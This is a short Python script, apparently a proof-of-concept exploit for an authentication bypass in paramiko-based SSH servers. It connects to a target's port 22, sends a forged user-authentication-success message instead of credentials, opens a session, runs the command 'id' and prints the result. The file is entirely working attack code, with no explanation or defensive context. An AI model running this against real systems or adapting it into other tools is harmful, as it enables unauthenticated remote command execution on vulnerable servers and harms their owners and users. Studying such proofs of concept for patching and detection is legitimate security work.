import sys
import time
import ipaddress
import paramiko
import socket

s = socket.socket()
s.connect((sys.argv[1], 22))

msg = paramiko.message.Message()
t = paramiko.transport.Transport(s)
t.start_client()

msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(msg)

c = t.open_session(timeout=5)
c.exec_command("id")
out = c.makefile("rb", 2048)
output = out.read()
s.close()
print(output)
